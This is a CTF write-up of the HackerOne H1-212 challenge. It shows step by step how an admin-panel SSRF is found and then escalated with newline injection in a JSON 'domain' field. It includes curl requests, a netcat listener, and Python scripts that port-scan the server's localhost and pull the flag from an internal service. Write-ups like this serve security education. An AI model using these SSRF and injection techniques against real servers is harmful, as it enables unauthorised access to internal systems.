As I woke up in the morning, there was a load of chatter about a HackerOne CTF for the H1-212 event, and that the winners will be flown to NYC. This seemed like the best oppurtuinity for me to show my talent, as I am more of a CTF/challenges guy(although I sometimes do Bug Bounties on H1). Funny thing was that I had just flown back home from NYC last night after CSAW High School Forensics final round at New York University.

This was the challenge description
```
An engineer of acme.org launched a new server for a new admin panel at http://104.236.20.43/. 
He is completely confident that the server can’t be hacked. He added a tripwire that notifies him when the flag file is read. 
He also noticed that the default Apache page is still there, but according to him that’s intentional and doesn’t hurt anyone. 
Your goal? Read the flag!
```
![img1](https://i.imgur.com/OL64nj7.png)

Visiting the given IP showed the default Apache page, which apparently was intentional. In the challenge description, it says that the admin panel of acme.org is hosted on that IP, so what ways can an admin panel be hosted on a IP?

Using some critical thinking skills, we deduced to the following possibilties:

- A directory 
- A virtual host

So firstly, I tried the usual directories where the admin panel could be present (`/admin/` or `/administrator/`), but no success.

Since acme.org is an expired domain, what if they were mitgating their whole domain to this new IP, and were using a vhost configuration in apache. So a host header of acme.org might work. I sent the following request with curl
```sh
jazzy@lolbox ~ $ curl -H 'Host: acme.org' 'http://104.236.20.43/'

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
--more--
```

But Alas, it still returned the default page. Um so what other way could they have a admin panel on this IP? 

After a few minutes of thinking, it magically popped into my head, a subdomain.

What's the most logical subdomain to try for an admin panel, yea `admin.acme.org`. So this curl request was fired next
```sh
jazzy@lolbox ~ $ curl -H 'Host: admin.acme.org' 'http://104.236.20.43/'
jazzy@lolbox ~ $
```
And suspiciously, there is no response. Um that's weird. Let's look at the headers.
```sh
jazzy@lolbox ~ $ curl -I -H 'Host: admin.acme.org' 'http://104.236.20.43/'
HTTP/1.1 200 OK
Date: Thu, 16 Nov 2017 12:05:51 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: admin=no
Content-Type: text/html; charset=UTF-8
```

Finally, our suspicion was true. There actually might be an admin panel there, as there is an `admin` cookie returned with a value of `no`. So what's the most logical thing to try now? 

Send the request again with the value of the `admin` cookie set to `yes`

```sh
jazzy@lolbox ~ $ curl -H 'Host: admin.acme.org' -b 'admin=yes' 'http://104.236.20.43/' 
jazzy@lolbox ~ $
```

Well, there's still no response, let's look at the headers now

```sh
HTTP/1.1 405 Method Not Allowed
Date: Thu, 16 Nov 2017 12:09:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

Hmmm, that's interesting. `405 Method Not Allowed`. So apparently `GET` method is not allowed if the `admin` cookie is `yes`. At this point, I decided to just add an entry in my `/etc/hosts` file for `admin.acme.org` to resolve to that IP, so I wouldn't need to send the host header with each request. This was just to make my life easier.

This is what I added in my `/etc/hosts`

```jazzy@lolbox ~ $ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	lolbox
104.236.20.43	admin.acme.org
```

So now all requests to `admin.acme.org` would go to that IP with the host header as `admin.acme.org`

Now as a occasional bug hunter, I fired up dirbuster with the smallest wordlist, and found the following folders and files

```
/read.php
/reset.php
/Applications/
/Desktop/
```

We will come back to the files and directories later.

Since the `GET` method is not allowed on the index, let's try some other http methods

```sh
jazzy@lolbox ~ $ curl -X POST -I -b 'admin=yes' 'admin.acme.org'
HTTP/1.1 406 Not Acceptable
Date: Thu, 16 Nov 2017 12:16:09 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

jazzy@lolbox ~ $ curl -X OPTIONS -I -b 'admin=yes' 'admin.acme.org'
HTTP/1.1 405 Method Not Allowed
Date: Thu, 16 Nov 2017 12:16:17 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

jazzy@lolbox ~ $ curl -X TRACE -I -b 'admin=yes' 'admin.acme.org'
HTTP/1.1 405 Method Not Allowed
Date: Thu, 16 Nov 2017 12:16:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Allow: 
Content-Length: 303
Content-Type: text/html; charset=iso-8859-1
```

So the only thing which is interesting above is that when we send a `POST` request, it gives a `406 Not Acceptable` instead of `405 Not Allowed` as with every other method.

So maybe it has something to do with `POST`. I tried sending some random `POST` data with the request, but no success.

```sh
jazzy@lolbox ~ $ curl -X POST -b 'admin=yes' -d 'random=test' 'admin.acme.org' -v
* Rebuilt URL to: admin.acme.org/
*   Trying 104.236.20.43...
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> POST / HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie: admin=yes
> Content-Length: 11
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 11 out of 11 bytes
< HTTP/1.1 406 Not Acceptable
< Date: Thu, 16 Nov 2017 12:21:05 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host admin.acme.org left intact

```

Still `406`.This got me thinking for quite a bit. I read a lot about `406`, and it usually sent when the server can't respond with the data types specified in `Accept` header. But since curl sends an `Accept` header of value `*/*`, which basically means accept any data type, something else is wrong.

What if instead of response, we are sending the wrong data type in the `POST` request itself? Although the server wouldn't normally respond with a `406` then, this was a CTF made by the legendary Jobert(The PHP hacker), widely known to make the life of hackers miserable. He might be giving us a hint about the data type by the `406`, although it isn't obvious. Maybe the `Content-Type` of the `POST` request is not of `application/x-www-form-urlencoded`, but maybe some other type.

So what's the other most used data type? yep, JSON. 

I fired up another post request with the `Content-Type` as `application/json`

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' 'admin.acme.org' 
{"error":{"body":"unable to decode"}}
```

Hmm, that's super interesting, it is trying to decode the JSON body, but since my request didn't have any JSON data, it returned an error. Let's try sending some random JSON

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"random" : "data"}' 'admin.acme.org' 
{"error":{"domain":"required"}}
```

So it looks like it requires a `domain` in the JSON data. Let's give it a `domain` in the JSON then.

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "test.com"}' 'admin.acme.org' 
{"error":{"domain":"incorrect value, .com domain expected"}}
```

Umm, that's weird. The domain I provided is a `.com` domain. Let's try some more maybe.

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "test123.com"}' 'admin.acme.org' 
{"error":{"domain":"incorrect value, .com domain expected"}}

jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "test.test123.com"}' 'admin.acme.org' 
{"error":{"domain":"incorrect value, sub domain should contain 212"}}
```

Okayy so, it is expecting a domain with subdomain, which has the number `212` in it's subdomain. Let's see

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "212test.test123.com"}' 'admin.acme.org' 
{"next":"\/read.php?id=0"}
```

Finally a positive response. It sends us to another file(`read.php`), which we also discovered in our initial recon with dirbuster. So we send a request to that file with the given parameter.

```sh
jazzy@lolbox ~ $ curl -b 'admin=yes' 'http://admin.acme.org/read.php?id=0'
{"data":""}
```

Well, it returns JSON with only a single key `data`, whose value is empty. I didn't really knew what it was supposed to return, so i thought of trying it with a valid domain now.

So now, we need a valid domain which has a subdomain with the number `212` in it, and it should be a .com domain. Fortunately, I knew a guy who owns a .com, and he gave me access to his CPanel.

![img](https://i.imgur.com/7ShqALn.png)

Next thing, I set up a subdomain `212lol.channelcs.com`, and hosted a `index.php` with the following PHP

```php
<?php echo "lol"; ?>
```

So it basically just echo'ed 'lol' whenever it is requested. Then I gave it a try in `admin.acme.org`

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "212lol.channelcs.com"}' 'admin.acme.org' 
{"next":"\/read.php?id=1"}

jazzy@lolbox ~ $ curl -b 'admin=yes' 'http://admin.acme.org/read.php?id=1'
{"data":"bG9s"}
```

`b69s` huh? That looks weird. 

After some head-bumps in the wall, i finally realized that it is the base64 encoded version of `lol`.

Well, it means that the server sends a request to the `domain` supplied, and returns the response. So it is a SSRF(Server Sided request Forgery). 

A SSRF basically means that we are able to send requests on the behalf of the server, and sometimes view the response. So basically we are forging requests, as the request seems to occur from the server, but in reality, we made the server make the request and return the response to us. 

There's quite a lot of things we can do with a SSRF, with the most important one being accessing the private ip space of the server by sending/forging requests to its internal/private network.

Now let's see how we can escalate this one. Since it had some domain name constrains, I was thinking to do a `302` redirect to any domain I wanted. Let' see if it works.

I changed the index.php to the following just to see if it followed redirects.

```php
<?php header("Location: /test.txt"); ?>
```

Trying the above requests again, this was the result

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "212lol.channelcs.com"}' 'admin.acme.org' 
{"next":"\/read.php?id=2"}

jazzy@lolbox ~ $ curl -b 'admin=yes' 'http://admin.acme.org/read.php?id=2'
{"data":""}
```

No RESPONSE, so it doesn't follow redirects. The next possible thing to do is to make the domain resolve to a private IP, which can be then used to view the services running internally and/or do a internal port scan. And since this SSRF is verbose(full response shown), it can possibly be used for priviledge escalation.

But apparently, the guy who's domain I borrowed uses a free hosting, so for subdomains, the free host only allows setting up CNAMEs, not A records. And I can't just enter a IP in the CNAME field because that will break it, and I don't have any other domains to use. 

This stumped for a while, until i remembered a pretty usefull service known as [nip.io](http://nip.io/). nip.io basically provides a wildcard DNS service, for example `23.23.23.23.nip.io` would resolve to `23.23.23.23`. 

The idea was that I could use a nip.io address as my CNAME, which would then get resolved to the IP i want. So I pointed the CNAME to `127.0.0.1.nip.io`.

![imag](https://i.imgur.com/onTDNPk.png)

Now let's try it with our newest subdomain, which will resolve to localhost and follows all our constrains.

```sh
jazzy@lolbox ~ $ curl -X POST -H 'Content-Type: application/json' -b 'admin=yes' -d '{"domain" : "212local.channelcs.com"}' 'admin.acme.org' 
{"next":"\/read.php?id=3"}

jazzy@lolbox ~ $ curl -b 'admin=yes' 'http://admin.acme.org/read.php?id=3'
{"data":"CjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5z.....
--more--
```

Damn, I got a pretty large response. After decoding it, turns out, it is a default apache page, same as we see when visiting the IP directly. So it confirms that we are able to send requests to localhost.

![imager](https://i.imgur.com/Dt5HDcV.png)

![imager2](https://i.imgur.com/BVhX9ZB.png)

But that won't be much usefull, since the IP is of a `DigitalOcean` box, and we can't even send requests to any other port than the default web server port(80) due to the constrains.

Now I just wanted to play around with constrains and see how much I can bend them, so I wrote a quick python script which would take the `domain` as a command line parameter, send the first request, and then read the response from `read.php`. Here is the script.

```python
import requests
import sys
import json

if len(sys.argv) < 2:
	print "No domain supplied"
	exit(0)

data = '{"domain":"%s"}'

domain = 'http://admin.acme.org/index.php'
readp = 'http://admin.acme.org/read.php?id=%d'

def readId(idd):
	if idd == -1:
		return ""
	print "Reading id -> %d"%idd
	return requests.get(readp%idd,cookies={'admin':'yes'},timeout=2.5).json()['data']

def getId(val):
	ret = requests.post(domain,json=json.loads(data%val), cookies={'admin':'yes'}, timeout=2.5).json()
	if 'error' in ret:
		print "Error -> %s"%ret['error']
		return -1
	else:
		return int(ret['next'].split("=")[1])
try:
	res = readId(getId(sys.argv[1])).decode('base64')
except:
	res = ""

if res == "":
	print "Empty response"
else:
	print res
  ```

I started fuzzing manually, you can invoke the above script like this, and it'll show you the response

```sh
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212local.channelcs.com'
Reading id -> 7

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
--more--
```

After a bit of manual fuzzing, I deduced the following conclusions

- There should be atleast 2 periods in the `domain`
- The string before the first period should include the number '212'
- The last 4 characters should be '.com'
- There were some forbidden characters like '?' and '#'
- It does not care about any other characters in the middle, we could have anything characters in the domain(except some blacklisted ones).

So now to see how it behaves with different characters, I set up another subdomain, which pointed to my server, on which I started a netcat listener to view the requests manually.

![hagm](https://i.imgur.com/xU7TZWk.png)

At this point, I also thought about trying some other stuff like File uri and other protocols, but with the strict constrains, I wasn't able to work them out.

So the domain `212ror.channelcs.com` pointed to my remote server(`45.32.162.220`) with the same CNAME trick. On my server, I set up a netcat listener on port 80 to view the full verbose requests, and how the challenge server handles `domains` with differnt characters

```sh
root@op:~$ while true; do echo "HEHE"|nc -nlvp 80; done
Listening on [0.0.0.0] (family 0, port 80)
```

`root@op` is the remote server

Now I just tried messing around with domain value to see what I could do

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com'
Reading id -> 47
HEHE

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com'
Reading id -> 48
HEHE

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com/lol'
Error -> {u'domain': u'incorrect value, .com domain expected'}
Empty response
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com/lol.com'
Reading id -> 49
HEHE

--local--

--remote--

root@op:~$ while true; do echo "HEHE"|nc -nlvp 80; done
Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 34852)
GET / HTTP/1.0
Host: 212ror.channelcs.com

Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 34882)
GET / HTTP/1.0
Host: 212ror.channelcs.com

Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 34954)
GET /lol.com HTTP/1.0
Host: 212ror.channelcs.com

--remote--
```

So, since it only checks if the last 3 words are '.com', we may be actually able to send requests to files other than index. Let's investigate it a bit more and see what we are able to achieve with it.

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com/lol#.com'
Error -> {u'domain': u'domain cannot contain #'}
Empty response
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com/lol?.com'
Error -> {u'domain': u'domain cannot contain ?'}
Empty response
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com/lol .com'
Reading id -> 50
HEHE

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com:83/lol .com'
Reading id -> 51
Empty response

--local--

--remote--

Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 35950)
GET /lol .com HTTP/1.0
Host: 212ror.channelcs.com

--remote--
```

We didn't get a error when we entered the port '83' in one of the requests, and since we didn't a get request on our server either, maybe it actually tried to connect to 83. Let's see.

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com:83/lol.com'
Reading id -> 52
HEHE83

--local--

--remote--

root@op:~$ while true; do echo "HEHE83"|nc -nlvp 83; done
Listening on [0.0.0.0] (family 0, port 83)
Connection from [104.236.20.43] port 83 [tcp/*] accepted (family 2, sport 44046)
GET /lol.com HTTP/1.0
Host: 212ror.channelcs.com

--remote--
```

Nicee, so now we are able to send requests to arbitary ports, and view their responses. Let's mess around with it some more :)

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com:83/ \rlol.com'
Reading id -> 53
HEHE83

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com:83/ \n\rlol.com'
Reading id -> 55
Empty response

--local--

--remote--

Listening on [0.0.0.0] (family 0, port 83)
Connection from [104.236.20.43] port 83 [tcp/*] accepted (family 2, sport 47924)
lol.com HTTP/1.0
Host: 212ror.channelcs.com

--remote--
```

There's actually a couple interesting things in there.

First of all, when we injected the carriage return, it messed up the http verb(`GET`) in the request. `lol.com` overwrote the http verb.

The second thing is that after we injected the newline, we didn't get a connection to our server, and the `Reading ID` skipped '54'. It went directly from '53' to '55'. This actually took me quite a bit of time to notice.(Thanks to my old habit of debug printing everything).

Let's use curl and send a request to the '54'th ID.

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ curl 'admin.acme.org/read.php?id=54' -b 'admin=yes'
{"data":"SEVIRTgzCg=="}
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ echo "SEVIRTgzCg=="|base64 -d
HEHE83

--local--

--remote--

Listening on [0.0.0.0] (family 0, port 83)
Connection from [104.236.20.43] port 83 [tcp/*] accepted (family 2, sport 55678)
GET /  HTTP/1.0
Host: 212ror.channelcs.com

--remote--

```

Apparently the 54th ID sent a request to our server on port 83 and returned the response. This is getting interesting. Let's summarize what exactly happened

- We injected a newline into the domain, and the ID which gets returned suddenly skips one number.
- Sending a request to the ID of the skipped number sends a request to our server, which was the domain before newline
- The ID which is returned gives out no response, and since we had `lol.com` after the newline, maybe the returned ID sent a request to `lol.com` which returned nothing.

Let's try it again, but now with valid domains

So I set up another subdomain(`another.channelcs.com`) with the same CNAME trick to point to my server. Now let's see what happens

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212ror.channelcs.com/ \nanother.channelcs.com'
Reading id -> 59
HEHE

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ curl 'admin.acme.org/read.php?id=58' -b 'admin=yes'
{"data":"SEVIRQo="}

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ echo "SEVIRQo="|base64 -d
HEHE

--local--

--remote--

root@op:~$ while true; do echo "HEHE"|nc -nlvp 80; done
Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 58294)
GET / HTTP/1.0
Host: another.channelcs.com

Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 58590)
GET /  HTTP/1.0
Host: 212ror.channelcs.com

--remote--
```

Our suspicion is confirmed, it skips one ID when a newline is injected, and it only returns the ID of the domain after newline.

But then we used curl curl to send a request to the ID which was skipped, and then a request appears on our server with the `host` as the domain before newline.

So basically at backend, the value of `domain` is split with newline as a token, and then each of the domains is assigned an ID, and only the last one is returned in the response.

So, basically all the constrains are bypassed now? aren't they? Here's the plan:

Instead of injecting one newline, we can inject two newlines. The first domain will satisfy the subdomain condition, the third one will satisfy the '.com' at the end, and we can use anything as the middle domain.
```
{"domain" : "212sub.<random>\n<any domain we want>/<any path>\n<random>.com"}
```

And then since it will return the ID of the last one, we can just subtract 1 from it, and then send a request to `read.php` with that ID, and TADA, the response will be returned to us.

Let's try it

```sh
--local--

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212.randomd.com\n45.32.162.220/lol.file\nanother.lol.com'
Reading id -> 62
Empty response

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ curl 'admin.acme.org/read.php?id=61' -b 'admin=yes'
{"data":"SEVIRQo="}

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ echo "SEVIRQo="|base64 -d
HEHE

--local--

--remote--

Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.20.43] port 80 [tcp/*] accepted (family 2, sport 42476)
GET /lol.file HTTP/1.0
Host: 45.32.162.22

--remote--

```

So FINALLY, it works. Now what?? 

Good question. I was stuck here for 2 hours. I didn't know what I'd do now since I escalated the SSRF to max i could. I tried using file URI to load local files, but no luck. I was totally stuck. Goddamn @jobert.

Then it just magically occured to me that I should port scan their localhost, maybe they have some interesting services running there. I modified the script to do a port scan of the localhost. Here is the modified script.

```python
import requests
import json

data = '{"domain":"212.randd.com/lol\\nlocalhost:%s\\ntest.com"}'

domain = 'http://admin.acme.org/index.php'
readp = 'http://admin.acme.org/read.php?id=%d'

def readId(idd):
	return requests.get(readp%idd,cookies={'admin':'yes'},timeout=2.5).json()['data']

def getPort(num):
	return int(requests.post(domain,json=json.loads(data%num), cookies={'admin':'yes'}, timeout=2.5).json()['next'].split('=')[1])


for m in range(65535):
	try:
		print "Doing Port : %d"%m
		portResp =  readId(getPort(m)-1)
		if portResp != "":
			print "Port %d response ==> %s"%(m,portResp.decode('base64'))
	except:
		continue

```

I also deleted some stuff which I thought was unnecessary now. Running the script, I just waited for some magic to happen.

```sh
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python scan.py
Doing Port : 0
Doing Port : 1
Doing Port : 2
Doing Port : 3
Doing Port : 4
Doing Port : 5
Doing Port : 6
Doing Port : 7
Doing Port : 8
Doing Port : 9
Doing Port : 10
Doing Port : 11
Doing Port : 12
Doing Port : 13
Doing Port : 14
Doing Port : 15
Doing Port : 16
Doing Port : 17
Doing Port : 18
Doing Port : 19
Doing Port : 20
Doing Port : 21
Doing Port : 22
Port 22 response ==> SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.

Doing Port : 23
Doing Port : 24
...skipping...
Doing Port : 1336
Doing Port : 1337
Port 1337 response ==> Hmm, where would it be?

Doing Port : 1338
Doing Port : 1339
Doing Port : 1340
Doing Port : 1341
```

Port 1337 has a weird response. Let's investigate it more. I edited my `ssrf.py` to request ID-1, and started messing around port 1337 of localhost

```sh
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212.randomd.com\nlocalhost:1337\nanother.lol.com'
Reading id -> 5674
Hmm, where would it be?

jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212.randomd.com\nlocalhost:1337/lol\nanother.lol.com'
Reading id -> 5677
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>
```

Hmm, it looks like a nginx web server is running on port 1337. Why could that be? 

Then it occured to me, and I tried requesting the `/flag` file on port 1337. And BOOM, i finally got the flag after 9 hours of misery.

```sh
jazzy@lolbox /home/data/Hack_stuff/h1ctf2 $ python ssrf.py '212.randomd.com\nlocalhost:1337/flag\nanother.lol.com'
Reading id -> 5680
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```

So the flag is ```FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6```, and this marks the end of the writeup. 

As a sidenote, the `reset.php` discovered in the dirbuster scan is just a file which resets all the IDs, so they start from 0 again. 

Hope to see you all at NYC, or atleast some swag if I don't get selected. 

PS: I spent more time on this writeup than the actual CTF.

Regards,

Jazzy
